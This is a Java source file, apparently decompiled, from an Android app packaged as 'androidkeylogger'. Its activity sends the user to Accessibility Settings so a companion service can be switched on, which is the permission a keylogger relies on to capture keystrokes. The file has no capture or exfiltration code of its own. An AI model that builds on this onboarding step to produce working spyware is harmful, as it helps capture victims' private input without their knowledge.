package com.azamovhudstc.androidkeylogger;


import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;


public class AccessibilityActivity extends AppCompatActivity {
    private /* synthetic */ void K(View view) {
        try {
            SvcAcc.j = true;
            startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
        } catch (Exception e) {
            Toast.makeText(this, e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    public void onBackPressed() {
        finishAffinity();
        super.onBackPressed();
    }

    /* Access modifiers changed, original: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (SvcAcc.i) {
            SvcAcc.j = false;
            Toast.makeText(this, getString(R.string.type_something), Toast.LENGTH_LONG).show();
            finish();
            return;
        }
        setContentView((int) R.layout.activity_accessibility);
        findViewById(R.id.btn501925).setOnClickListener(new View.OnClickListener() {
            public final void onClick(View view) {
                AccessibilityActivity.this.K(view);
            }
        });
    }

    /* Access modifiers changed, original: protected */
    public void onDestroy() {
        super.onDestroy();
        SvcAcc.j = false;
    }

    /* Access modifiers changed, original: protected */
    public void onResume() {
        super.onResume();
        if (SvcAcc.i) {
            SvcAcc.j = false;
            Toast.makeText(this, getString(R.string.type_something), Toast.LENGTH_LONG).show();
            finish();
        }
    }
}